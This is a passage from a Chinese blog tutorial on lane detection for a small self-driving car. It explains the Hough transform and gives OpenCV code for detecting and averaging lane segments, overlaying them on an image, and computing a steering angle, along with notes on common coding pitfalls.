在图片中，那么图片中，必需有N多点在直线上（像素点代入表达式成立），只要有这条直线上的两个点，就能确定这条直线。该问题可以转换为：求解所有的(m,b)组合。<strong>【以下是部分原理，不感兴趣的同学可以直接跳到代码】</strong></p><p>设置两个坐标系，左边的坐标系表示的是(x,y)值，右边的坐标系表达的是(m,b)的值，即直线的参数值。那么一个(x,y)点在右边对应的就是一条线，左边坐标系的一条直线就是右边坐标系中的一个点。这样，右边左边系中的交点就表示有多个点经过(k,b)确定的直线。但是，该方法存在一个问题，(m,b)的取值范围太大。</p><p> <img src="/.io//a3c0d9612c82496cbd1bdaa987971f1c.png" alt="img"> </p><p>为了解决(m,b)取值范围过大的问题，在直线的表示方面用 <em>xcosθ+ysinθ&#x3D;r</em> 的规范式代替一般表达式，参数空间变成(θ,r)，0&#x3D;&lt;θ&lt;&#x3D;2PI。这样图像空间中的一个像素点在参数空间中就是一条曲线（三角函数曲线）。</p><p> <img src="/.io//2238243e98dd8ea95315fa27848f801f.png" alt="image-20220321140942980"> </p><p> 此时，图像空间和参数空间的对应关系如下： </p><p> <img src="/.io//20200211011825716.jpg" alt="img"> </p><p>从图中可以看出，霍夫直线检测即为在参数空间中对r和theta投票的过程，得票最高者为最终的直线参数。  theta表示与直线垂直的线与x轴的夹角，那么他的取值范围就是-pi到pi ，但显然取0-pi就可以表示所有直线。</p><p>更详细的数学原理请查看<a href="https://blog.csdn.net/u013066730/article/details/123086027">这篇博客</a> ，其中涉及到笛卡尔坐标向极坐标变换(事实上是一个特殊的参数空间)的讨论，对数学感兴趣的同学可以深入了解，这里不再展示。走到这一步，流程图如下所示。</p><p>霍夫线段检测算法原理步骤如下：</p><ul><li>初始化(θ,r)空间，N(θ,r)&#x3D;0 。（N(θ,r)表示在该参数表示的直线上的像素点的个数）</li><li>对于每一个像素点(x,y)，在参数空间中找出令 xcosθ+ysinθ&#x3D;r 的(θ,r)坐标，N(θ,r)+&#x3D;1</li><li>统计所有N(θ,r)的大小，取出N(θ,r)&gt;threasold的参数 。（threadsold是预设的阈值）</li></ul><p> OpenCV中封装好了基于霍夫变换的直线检测方法HoughLinesP，下面我们就来使用它进行线段检测。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">detect_line</span>(<span class="params">edges</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    基于霍夫变换的直线检测</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    rho = <span class="number">1</span>  <span class="comment"># 距离精度：1像素</span></span><br><span class="line">    angle = np.pi / <span class="number">180</span>  <span class="comment">#角度精度：1度</span></span><br><span class="line">    min_thr = <span class="number">10</span>  <span class="comment">#最少投票数</span></span><br><span class="line">    lines = cv2.HoughLinesP(edges,</span><br><span class="line">                            rho,</span><br><span class="line">                            angle,</span><br><span class="line">                            min_thr,</span><br><span class="line">                            np.array([]),</span><br><span class="line">                            minLineLength=<span class="number">8</span>,</span><br><span class="line">                            maxLineGap=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> lines</span><br></pre></td></tr></table></figure><p>我们可以print一下lines，结果如下(此处仅作展示，后面有这一步的完整代码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[[[  1  94  47  62]]</span><br><span class="line"> [[143  94 156 103]]</span><br><span class="line"> [[103  67 119  77]]</span><br><span class="line"> [[  1  86  41  60]]</span><br><span class="line"> [[101  52 158  56]]</span><br><span class="line"> [[104  69 159 100]]</span><br><span class="line"> [[  5  52  22  53]]</span><br><span class="line"> [[129  63 140  63]]</span><br><span class="line"> [[ 87  50 110  52]]</span><br><span class="line"> [[  0  88  17  77]]</span><br><span class="line"> [[ 88  55 134  89]]</span><br><span class="line"> [[  2  94  36  70]]</span><br><span class="line"> [[ 17  50  29  50]]</span><br><span class="line"> [[ 23  73  42  60]]</span><br><span class="line"> [[ 90  56 110  70]]</span><br><span class="line"> [[  1  56  16  51]]</span><br><span class="line"> [[128  55 148  56]]</span><br><span class="line"> [[  0  89   8  84]]</span><br><span class="line"> [[ 88  56 112  75]]</span><br><span class="line"> [[151 101 159 104]]</span><br><span class="line"> [[ 30  73  43  61]]]</span><br></pre></td></tr></table></figure><p>返回的每组值都是一条线段表示线段起始位置(x_start,y_start,x_end,y_end)。可以看到小线段很多，我们对这些小线段做一下聚类和平均： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">average_lines</span>(<span class="params">frame, lines, direction=<span class="string">&#x27;left&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    小线段聚类</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lane_lines = []</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(direction + <span class="string">&#x27;没有检测到线段&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> lane_lines</span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    fits = []</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> x1 == x2:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算拟合直线</span></span><br><span class="line">            fit = np.polyfit((x1, x2), (y1, y2), <span class="number">1</span>)</span><br><span class="line">            slope = fit[<span class="number">0</span>]</span><br><span class="line">            intercept = fit[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&#x27;left&#x27;</span> <span class="keyword">and</span> slope &lt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">            <span class="keyword">elif</span> direction == <span class="string">&#x27;right&#x27;</span> <span class="keyword">and</span> slope &gt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br><span class="line">    <span class="keyword">return</span> lane_lines</span><br></pre></td></tr></table></figure><p>这里需要注意，由于图像的y坐标跟我们数学上经常遇到的y坐标方向是相反的（图像的y坐标轴正向是朝下的），因此，左侧黄色实线斜率是负值，右侧白色实线斜率是正值。上述代码我们将所有小线段的斜率和截距进行了平均，并且使用make_points函数重新计算了该平均线对应到图像上的起始坐标位置，make_points函数如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_points</span>(<span class="params">frame, line</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据直线斜率和截距计算线段起始坐标</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    slope, intercept = line</span><br><span class="line">    y1 = height</span><br><span class="line">    y2 = <span class="built_in">int</span>(y1 * <span class="number">1</span> / <span class="number">2</span>)</span><br><span class="line">    x1 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y1 - intercept) / slope)))</span><br><span class="line">    x2 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y2 - intercept) / slope)))</span><br><span class="line">    <span class="keyword">return</span> [[x1, y1, x2, y2]]</span><br></pre></td></tr></table></figure><p>上述函数最后返回的是坐标数值，这样看线段的坐标值不是很直观，我们可以写个脚本显式的观察这些线段： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    line_img = np.zeros_like(frame)</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">                cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width)</span><br><span class="line">    line_img = cv2.addWeighted(frame, <span class="number">0.8</span>, line_img, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> line_img</span><br></pre></td></tr></table></figure><p>上述代码我们将行道线按照一定权重与原图进行合成，方便我们查看最终效果。 </p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_line</span>(<span class="params">edges</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    基于霍夫变换的直线检测</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    rho = <span class="number">1</span>  <span class="comment"># 距离精度：1像素</span></span><br><span class="line">    angle = np.pi / <span class="number">180</span>  <span class="comment"># 角度精度：1度</span></span><br><span class="line">    min_thr = <span class="number">10</span>  <span class="comment"># 最少投票数</span></span><br><span class="line">    lines = cv2.HoughLinesP(edges,rho, angle,min_thr,np.array([]),minLineLength=<span class="number">8</span>,maxLineGap=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">average_lines</span>(<span class="params">frame, lines, direction=<span class="string">&#x27;left&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    小线段聚类</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lane_lines = []</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(direction + <span class="string">&#x27;没有检测到线段&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> lane_lines</span><br><span class="line">    <span class="comment">#height, width , _= frame.shape</span></span><br><span class="line">    fits = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> x1 == x2:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算拟合直线</span></span><br><span class="line">            fit = np.polyfit((x1, x2), (y1, y2), <span class="number">1</span>)</span><br><span class="line">            slope = fit[<span class="number">0</span>]</span><br><span class="line">            intercept = fit[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&#x27;left&#x27;</span> <span class="keyword">and</span> slope &lt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">            <span class="keyword">elif</span> direction == <span class="string">&#x27;right&#x27;</span> <span class="keyword">and</span> slope &gt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br><span class="line">    <span class="keyword">return</span> lane_lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_points</span>(<span class="params">frame, line</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据直线斜率和截距计算线段起始坐标</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width= frame.shape</span><br><span class="line">    slope, intercept = line</span><br><span class="line">    y1 = height</span><br><span class="line">    y2 = <span class="built_in">int</span>(y1 * <span class="number">1</span> / <span class="number">2</span>)</span><br><span class="line">    x1 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y1 - intercept) / slope)))</span><br><span class="line">    x2 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y2 - intercept) / slope)))</span><br><span class="line">    <span class="keyword">return</span> [[x1, y1, x2, y2]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    line_img = np.zeros_like(frame)</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">                cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width)</span><br><span class="line">    line_img = cv2.addWeighted(frame, <span class="number">0.8</span>, line_img, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> line_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    yimg = cv2.imread(<span class="string">&#x27;yellow_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    wimg = cv2.imread(<span class="string">&#x27;white_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#霍夫变换</span></span><br><span class="line">    yimg_detect_line = detect_line(yimg)</span><br><span class="line">    wimg_detect_line = detect_line(wimg)</span><br><span class="line">    <span class="comment">#小线段聚类</span></span><br><span class="line">    yimg_average_lines = average_lines(yimg,yimg_detect_line,direction=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">    wimg_average_lines = average_lines(wimg,wimg_detect_line)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#在原图上展示线段</span></span><br><span class="line">    y=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    w=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    yellow_display_line = display_line(y, yimg_average_lines)</span><br><span class="line">    white_display_line = display_line(w, wimg_average_lines)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;yellow_display_line.jpg&#x27;</span>, yellow_display_line)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;white_display_line.jpg&#x27;</span>, white_display_line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#函数入口</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>我们来分析一下几段容易出错的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br></pre></td></tr></table></figure><p>注意此处已经嵌套调用了make_points函数，返回了图片的x，y坐标。后续不需要再进行make_points，否则将会出现传入参数错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    yimg = cv2.imread(<span class="string">&#x27;yellow_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    wimg = cv2.imread(<span class="string">&#x27;white_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里imread后面多带一个参数0，表示以单通道读入。即使图像显示为黑白，它仍然可能是三通道的，而yimg_detect_line中HoughLinesP霍夫变换只接受单通道的图片。这里不加0这个参数将会出现错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>注意line_color传入的rgb三色值是倒过来的，实际上红色对应的是(255，0，0)，而(0， 0， 255)是紫蓝色(?)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">height, width= frame.shape</span><br></pre></td></tr></table></figure><p>某些.shape返回的是三个参数，第三个表示的是通道数。一般用_ 来接收这个不需要用到的通道数，而此处不会返回这个值，所以加入_ 会出错。实际应该根据编译器的提示进行修改(因为我也没摸透为什么，可能图片经过其他函数的一些转换后，不会返回这个参数。实际上修改起来也比较简单。)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在原图上展示线段</span></span><br><span class="line">    y=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    w=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    yellow_display_line = display_line(y, yimg_average_lines)</span><br><span class="line">    white_display_line = display_line(w, wimg_average_lines)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;yellow_display_line.jpg&#x27;</span>, yellow_display_line)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;white_display_line.jpg&#x27;</span>, white_display_line)</span><br></pre></td></tr></table></figure><p>这里读入我们拍摄的彩色图片，将红色的线段合成上去。整体代码运行结果如下：</p><p><img src="/.io//white_display_line.jpg"></p><p><img src="/.io//yellow_display_line.jpg"></p><p> 从效果上看我们准确的将两条行道线检测了出来。接下来就是根据这两条行道线进行自动驾驶方向控制。 </p><h3 id="2-5动作控制：转向角"><a href="#2-5动作控制：转向角" class="headerlink" title="2.5动作控制：转向角"></a>2.5动作控制：转向角</h3><p>针对前面的测试图片，我们可以有效的检测出两条行道线（左侧黄色线和右侧白色线），但是在真实的运行过程中，可能会出现3种情况：</p><p>(1)正常检测到2条行道线：这种情况一般是直线车道且车辆稳定运行在行道线内，这时候我们只需要根据检测出的两条行道线微调整角度即可。</p><p>(2)检测出1条行道线：这种情况在转弯处容易出现，或者在车辆开始大范围偏离时出现，这时候我们的策略应该是向能够检测到的这条行道线方向前进。</p><p>(3)检测不到行道线：这种情况应该停下小车。</p><p>因此，针对三种情况我们需要不同的处理方式。代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算转向角</span></span><br><span class="line">x_offset = <span class="number">0</span></span><br><span class="line">y_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(yellow_lane)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane)&gt;<span class="number">0</span>:  <span class="comment"># 检测到2条线</span></span><br><span class="line">    _, _, left_x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    _, _, right_x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    mid = <span class="built_in">int</span>(width / <span class="number">2</span>)</span><br><span class="line">    x_offset = (left_x2 + right_x2) / <span class="number">2</span> - mid</span><br><span class="line">    y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(yellow_lane)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(yellow_lane[<span class="number">0</span>])==<span class="number">1</span>:  <span class="comment"># 只检测到黄色行道线</span></span><br><span class="line">    x1, _, x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    x_offset = x2 - x1</span><br><span class="line">    y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(white_lane)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane[<span class="number">0</span>])==<span class="number">1</span>:  <span class="comment"># 只检测到白色行道线</span></span><br><span class="line">    x1, _, x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    x_offset = x2 - x1</span><br><span class="line">    y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># 一条线都没检测到</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;检测不到行道线，退出程序&#x27;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">angle_to_mid_radian = math.atan(x_offset / y_offset)  </span><br><span class="line">angle_to_mid_deg = <span class="built_in">int</span>(angle_to_mid_radian * <span class="number">180.0</span> / math.pi) </span><br><span class="line">steering_angle = angle_to_mid_deg/<span class="number">45.0</span></span><br><span class="line">action = np.array([steering_angle, <span class="number">0.3</span>])  <span class="comment"># 油门值恒定</span></span><br></pre></td></tr></table></figure><p> 到这里我们就可以开始启动程序了。完整代码如下所示： </p><p>先编写自定义库tools：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span 